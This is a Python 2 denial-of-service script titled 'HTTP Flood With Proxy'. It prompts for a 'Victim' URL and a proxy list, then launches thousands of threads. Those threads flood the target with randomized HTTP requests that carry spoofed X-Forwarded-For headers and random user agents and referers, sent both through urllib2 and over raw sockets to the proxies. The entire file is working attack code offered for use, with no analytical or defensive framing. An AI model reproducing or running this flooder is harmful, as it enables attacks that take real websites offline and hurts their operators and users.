import random, socket, threading, time, sys, urllib2
#Loading Code
def progressbar(it, prefix = "", size = 60):
    count = len(it)
    def _show(_i):
        x = int(size*_i/count)
        sys.stdout.write("%s[%s%s] %i/%i\r" % (prefix, "#"*x, "_"*(size-x), _i, count))
        sys.stdout.flush()
    _show(0)
    for i, item in enumerate(it):
        yield item
        _show(i+1)
    sys.stdout.write("\n")
    sys.stdout.flush()
#Get User-Agent
in_file1 = open("user-agent.txt", "r")
user_agent = in_file1.read()
in_file1.close()
list_user_agent = user_agent.split("\n")
#Get Referer
in_file2 = open("referer.txt", "r")
referer = in_file2.read()
in_file2.close()
list_referer = referer.split("\n")
#Random String
def buildblock(size):
    out_str = ''
    for i in range(0, size):
	a = random.randint(65, 90)
	out_str += chr(a)
    return(out_str)
#Random IP List
def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
#TOOLS Attack
list_method_1 = ["OPTIONS", "GET", "HEAD", "POST", "PUT", "DELETE", "TRACE", "CONNECT"]
list_method_2 = ["GET", "POST"]
list_connection = ["Keep-Alive", "Close", "Persist"]
list_accept_encoding = ["gzip", "deflate", "sdch", "", "*", "compress", "identity"]
#Attack
class DDos(threading.Thread):
    def run(self):
        proxy_JKL = random.choice(list_proxy)
        proxy = random.choice(list_proxy).split(":")
        q_1 = random.choice(list_method_1) + " " + url + "?" + buildblock(random.randint(1,1000)) + "=" + str(random.randint(1, 1000)) + " HTTP/1." + str(random.randint(0,1)) + "\r\n"
        q_2 = random.choice(list_method_2) + " " + url + "?" + buildblock(random.randint(1,1000)) + "=" + str(random.randint(1, 1000)) + " HTTP/1." + str(random.randint(0,1)) + "\r\n"
        w = "Host: " + host_url + "\r\nKeep-Alive: " + str(random.randint(110,120)) + "\r\n"
        e = "User-Agent: " + random.choice(list_user_agent) + "\r\n"
        r = "Connection: " + random.choice(list_connection) + "\r\n"
        t = "Proxy-Connection: Keep-Alive\r\n"
        y = "Accept-Encoding: " + random.choice(list_accept_encoding) + "\r\n"
        u = "X-Forwarded-For: " + randomIpList() + "\r\n"
        i = "Cache-Control: max-age=" + str(random.randint(0,1000)) + "\r\n"
        o = "Referer: " + random.choice(list_referer) + buildblock(random.randint(1,100)) + "\r\n"
        httprequest_1 = q_1 + w + e + r + t + y + u + i + o + "\r\n"
        httprequest_2 = q_2 + w + e + r + t + u + "\r\n"
        httprequest_3 = q_2 + w + e + r + t + y + u + o + "\r\n"
        httprequest_4 = q_1 + w + e + "\r\n"
        httprequest_arr = [httprequest_1, httprequest_2, httprequest_3, httprequest_4]
        #Hulk FLoods HTTP
        request = urllib2.Request(url + "?" + buildblock(random.randint(1,1000)) + "=" + str(random.randint(1, 1000)))
        request.add_header("User-Agent", random.choice(list_user_agent))
        request.add_header("Cache-Control", "max-age=" + str(random.randint(0,1000)))
        request.add_header("Connection", random.choice(list_connection))
        request.add_header("Keep-Alive", random.randint(110,120))
        request.add_header("Host", host_url)
        request.add_header("Referer", random.choice(list_referer) + buildblock(random.randint(1,100)))
        while nload:
            time.sleep(1)
        while 1:
            try:
                proxy_hulk = urllib2.ProxyHandler({"http":proxy_JKL})
                opener = urllib2.build_opener(proxy_hulk)
                urllib2.install_opener(opener)
                urllib2.urlopen(request)
            except:
                proxy_JKL = random.choice(list_proxy)
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                
                httprequest = random.choice(httprequest_arr)
                a.send(httprequest)
                try:
                    a.send(httprequest)
                    print "Attacking [ " + host_url + " ] with [" + proxy[0] + ":" + proxy[1] + "]"
                except:
                    tts = 1
                    a.close()
            except:
                print "Proxy DIE"
                proxy = random.choice(list_proxy).split(":")
#Main DDos
print("\t\t\t\t\t##########################################")
print("\t\t\t\t\t## .----. HTTP Flood With Proxy .----.  ##")
print("\t\t\t\t\t##    .----.Code By JokerLjnk.----.     ##")
print("\t\t\t\t\t##        .----.#404_Error.----.        ##")
print("\t\t\t\t\t##        .Hacking And Security.        ##")
print("\t\t\t\t\t##########################################")
url = raw_input("Victim: ")
host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
in_file3 = open(raw_input("File proxy: "), "r")
proxyf = in_file3.read()
in_file3.close()
list_proxy = proxyf.split("\n")
thread = int(input("Threads (3000): "))
nload = 1
x = 0
for x in progressbar(range(thread), "Threads: ", 60):
    DDos().start()
    time.sleep(0.003)
print "Attacking ==========================>"
nload = 0
while not nload:
    time.sleep(1)
